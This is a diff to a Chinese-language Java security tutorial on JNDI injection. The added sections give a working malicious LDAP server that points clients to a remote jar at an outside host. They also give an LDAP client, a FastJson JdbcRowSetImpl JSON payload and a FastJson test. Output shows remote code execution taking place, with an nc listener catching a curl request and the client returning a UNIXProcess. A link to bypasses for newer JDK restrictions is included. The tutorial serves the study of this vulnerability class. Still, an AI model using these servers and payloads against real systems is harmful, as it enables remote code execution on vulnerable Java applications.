@@ -335,11 +335,11 @@ Object obj = context.lookup("rmi://127.0.0.1:9527/test");
 
 示例代码通过`lookup`会自动使用`rmiURLContext`处理`RMI`请求。
 
-## JNDI Reference
+## JNDI-Reference
 
 在`JNDI`服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制。
 
-### RMI 远程对象引用安全限制
+### RMI/LDAP远程对象引用安全限制
 
 在`RMI`服务中引用远程对象将受本地Java环境限制即本地的`java.rmi.server.useCodebaseOnly`配置必须为`false(允许加载远程对象)`，如果该值为`true`则禁止引用远程对象。除此之外被引用的`ObjectFactory`对象还将受到`com.sun.jndi.rmi.object.trustURLCodebase`配置限制，如果该值为`false(不信任远程引用对象)`一样无法调用远程的引用对象。
 
@@ -357,7 +357,9 @@ System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 
 `LDAP`在`JDK 11.0.1、8u191、7u201、6u211`后也将默认的`com.sun.jndi.ldap.object.trustURLCodebase`设置为了`false`。
 
-### 使用ObjectFactory创建恶意RMI对象
+高版本`JDK`可参考：[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)。
+
+### 使用创建恶意的ObjectFactory对象
 
 `JNDI`允许通过*对象工厂* (`javax.naming.spi.ObjectFactory`)动态加载对象实现，例如，当查找绑定在名称空间中的打印机时，如果打印服务将打印机的名称绑定到 Reference，则可以使用该打印机 Reference 创建一个打印机对象，从而查找的调用者可以在查找后直接在该打印机对象上操作。
 
@@ -396,7 +398,7 @@ public class ReferenceObjectFactory implements ObjectFactory {
 
 ### 创建恶意的RMI服务
 
-如果我们在`RMI`服务端绑定一个恶意的引用对象，`RMI`客户端在获取服务端绑定的对象时发现是一个`Reference`对象后检查当前`JVM`是否允许加载远程引用对象，如果允许加载则使用`URLClassLoader`加载我们构建的恶意对象工厂(`ReferenceObjectFactory`)类并调用其中的`getObjectInstance`方法。
+如果我们在`RMI`服务端绑定一个恶意的引用对象，`RMI`客户端在获取服务端绑定的对象时发现是一个`Reference`对象后检查当前`JVM`是否允许加载远程引用对象，如果允许加载且本地不存在此对象工厂类则使用`URLClassLoader`加载远程的`jar`，并加载我们构建的恶意对象工厂(`ReferenceObjectFactory`)类然后调用其中的`getObjectInstance`方法从而触发该方法中的恶意`RCE`代码。
 
 **包含恶意攻击的RMI服务端代码：**
 
@@ -461,7 +463,7 @@ RMI服务启动成功,服务地址:rmi://127.0.0.1:9527/test
 nc -vv -l 9000
 ```
 
-**客户端代码：**
+**RMI客户端代码：**
 
 ```java
 package com.anbai.sec.jndi.injection;
@@ -514,9 +516,236 @@ Accept: */*
 
 上面的示例演示了在`JVM`默认允许加载远程`RMI`引用对象所带来的`RCE`攻击，但在真实的环境下由于发起`RMI`请求的客户端的`JDK`版本大于我们的测试要求或者网络限制等可能会导致攻击失败。
 
-2016年的`BlackHat`上[us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)提到了包括`RMI`、`LDAP`、`CORBA`的JNDI注入方式攻击方式。
+### 创建恶意的LDAP服务 
 
-**JNDI注入参考：**
+`LDAP`和`RMI`同理，测试方法也同上。启动LDAP服务端程序后我们会在`LDAP`请求中返回一个含有恶意攻击代码的对象工厂的远程`jar`地址，客户端会加载我们构建的恶意对象工厂(`ReferenceObjectFactory`)类然后调用其中的`getObjectInstance`方法从而触发该方法中的恶意`RCE`代码。
 
-1. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
-2. https://paper.seebug.org/942/
+**包含恶意攻击的LDAP服务端代码：**
+
+```java
+package com.anbai.sec.jndi.injection;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+
+public class LDAPReferenceServerTest {
+
+   // 设置LDAP服务端口
+   public static final int SERVER_PORT = 3890;
+
+   // 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
+   public static final String BIND_HOST = "127.0.0.1";
+
+   // 设置一个实体名称
+   public static final String LDAP_ENTRY_NAME = "test";
+
+   // 获取LDAP服务地址
+   public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;
+
+   // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
+   public static final String REMOTE_REFERENCE_JAR = "http://p2j.cn/tools/jndi-test.jar";
+
+   // 设置LDAP基底DN
+   private static final String LDAP_BASE = "dc=javasec,dc=org";
+
+   public static void main(String[] args) {
+      try {
+         // 创建LDAP配置对象
+         InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+
+         // 设置LDAP监听配置信息
+         config.setListenerConfigs(new InMemoryListenerConfig(
+               "listen", InetAddress.getByName(BIND_HOST), SERVER_PORT,
+               ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
+               (SSLSocketFactory) SSLSocketFactory.getDefault())
+         );
+
+         // 添加自定义的LDAP操作拦截器
+         config.addInMemoryOperationInterceptor(new OperationInterceptor());
+
+         // 创建LDAP服务对象
+         InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+
+         // 启动服务
+         ds.startListening();
+
+         System.out.println("LDAP服务启动成功,服务地址：" + LDAP_URL);
+      } catch (Exception e) {
+         e.printStackTrace();
+      }
+   }
+
+   private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+      @Override
+      public void processSearchResult(InMemoryInterceptedSearchResult result) {
+         String base  = result.getRequest().getBaseDN();
+         Entry  entry = new Entry(base);
+
+         try {
+            // 设置对象的工厂类名
+            String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
+            entry.addAttribute("javaClassName", className);
+            entry.addAttribute("javaFactory", className);
+
+            // 设置远程的恶意引用对象的jar地址
+            entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);
+
+            // 设置LDAP objectClass
+            entry.addAttribute("objectClass", "javaNamingReference");
+
+            result.sendSearchEntry(entry);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+         } catch (Exception e1) {
+            e1.printStackTrace();
+         }
+      }
+
+   }
+  
+}
+```
+
+程序运行结果：
+
+```
+LDAP服务启动成功,服务地址：ldap://127.0.0.1:3890/test
+```
+
+**LDAP客户端代码：**
+
+```java
+package com.anbai.sec.jndi.injection;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+import static com.anbai.sec.jndi.injection.LDAPReferenceServerTest.LDAP_URL;
+
+/**
+ * Creator: yz
+ * Date: 2019/12/27
+ */
+public class LDAPReferenceClientTest {
+
+   public static void main(String[] args) {
+      try {
+//       // 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
+//       System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+
+         Context ctx = new InitialContext();
+
+         // 获取RMI绑定的恶意ReferenceWrapper对象
+         Object obj = ctx.lookup(LDAP_URL);
+
+         System.out.println(obj);
+      } catch (NamingException e) {
+         e.printStackTrace();
+      }
+   }
+
+}
+```
+
+程序运行结果：
+
+```
+java.lang.UNIXProcess@184f6be2
+```
+
+### JNDI注入漏洞利用
+
+2016年BlackHat大会上[us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)提到了包括`RMI`、`LDAP`、`CORBA`的`JNDI`注入方式攻击方式被广泛的利用于近年来的各种`JNDI`注入漏洞。
+
+触发`JNDI`注入漏洞的方式也是非常的简单，只需要直接或间接的调用`JNDI`服务，且`lookup`的参数值可控、`JDK`版本、服务器网络环境满足漏洞利用条件就可以成功的利用该漏洞了。
+
+**示例代码：**
+
+```java
+Context ctx = new InitialContext();
+
+// 获取RMI绑定的恶意ReferenceWrapper对象
+Object obj = ctx.lookup("注入JNDI服务URL");
+```
+我们只需间接的找到调用了`JNDI`的`lookup`方法的类且`lookup` 的`URL`可被我们恶意控制的后端接口或者服务即可利用。
+
+#### FastJson 反序列化JNDI注入示例
+
+比较典型的漏洞有`FastJson`的`JNDI`注入漏洞，`FastJson`在反序列化`JSON`对象时候会通过反射自动创建类实例且`FastJson`会根据传入的`JSON`字段间接的调用类成员变量的`setXXX`方法。`FastJson`这个反序列化功能看似无法实现`RCE`，但是有人找出多个符合`JNDI`注入漏洞利用条件的`Java`类(如：`com.sun.rowset.JdbcRowSetImpl`)从而实现了`RCE`。
+
+**JdbcRowSetImpl示例：**
+
+```jsp
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
+<%
+    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+    jdbcRowSet.setDataSourceName(request.getParameter("url"));
+    jdbcRowSet.setAutoCommit(true);
+%>
+```
+
+假设我们能够动态的创建出`JdbcRowSetImpl`类实例且可以间接的调用`setDataSourceName`和`setAutoCommit`方法，那么就有可能实现`JNDI`注入攻击。`FastJson`使用`JdbcRowSetImpl`实现`JNDI`注入攻击的大致的流程如下：
+
+1. 反射创建`com.sun.rowset.JdbcRowSetImpl`对象。
+2. 反射调用`setDataSourceName`方法，设置`JNDI`的`URL`。
+3. 反射调用`setAutoCommit`方法，该方法会试图使用`JNDI`获取数据源(`DataSource`)对象。
+4. 调用`lookup`方法去查找我们注入的`URL`所绑定的恶意的`JNDI`远程引用对象。
+5. 执行恶意的类对象工厂方法实现RCE。
+
+**FastJson JdbcRowSetImpl Payload：**
+
+```json
+{
+    "@type": "com.sun.rowset.JdbcRowSetImpl", 
+    "dataSourceName": "ldap://127.0.0.1:3890/test", 
+    "autoCommit": "true"
+}
+```
+
+**FastJson JNDI测试代码：**
+
+```java
+package com.anbai.sec.jndi.injection;
+
+import com.alibaba.fastjson.JSON;
+
+/**
+ * Creator: yz
+ * Date: 2019/12/28
+ */
+public class FastJsonRCETest {
+
+	public static void main(String[] args) {
+//			// 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
+//		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+		String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:3890/test\", \"autoCommit\": \"true\" }";
+
+		Object obj = JSON.parse(json);
+		System.out.println(obj);
+	}
+
+}
+```
+
+程序执行后nc会接收到本机的curl请求表明漏洞已利用成功：
+
+```
+GET / HTTP/1.1
+Host: localhost:9000
+User-Agent: curl/7.64.1
+Accept: */*
+```
+
